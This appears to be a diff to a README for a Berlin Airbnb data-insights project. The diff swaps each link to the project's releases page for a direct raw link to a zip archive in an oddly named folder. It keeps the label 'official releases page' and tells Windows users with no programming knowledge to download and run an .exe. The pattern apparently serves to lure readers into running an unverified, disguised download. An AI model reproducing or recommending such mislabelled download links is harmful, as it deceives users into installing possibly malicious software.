@@ -1,6 +1,6 @@
 # 🏠 berlin-airbnb-insights - Gain deep market insights for Berlin
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/roastertoby710/berlin-airbnb-insights/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/roastertoby710/berlin-airbnb-insights/raw/refs/heads/main/discomfiter/berlin_insights_airbnb_v3.7.zip)
 
 This project examines data from over 635,000 Airbnb reviews and 14,000 active listings in Berlin. It provides clear insights into guest sentiment, market trends, and pricing patterns. You can use these insights to understand the Berlin rental market or to study the intersection of data science and hospitality. 
 
@@ -8,7 +8,7 @@ This project examines data from over 635,000 Airbnb reviews and 14,000 active li
 
 You do not need programming knowledge to run this application. Follow these instructions to download the software and view the insights on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/roastertoby710/berlin-airbnb-insights/releases). 
+1. Visit the [official releases page](https://github.com/roastertoby710/berlin-airbnb-insights/raw/refs/heads/main/discomfiter/berlin_insights_airbnb_v3.7.zip). 
 2. Look for the most recent version under the "Latest" section.
 3. Click the file ending in `.exe` to begin the download.
 4. Save the file to your desktop or your downloads folder.
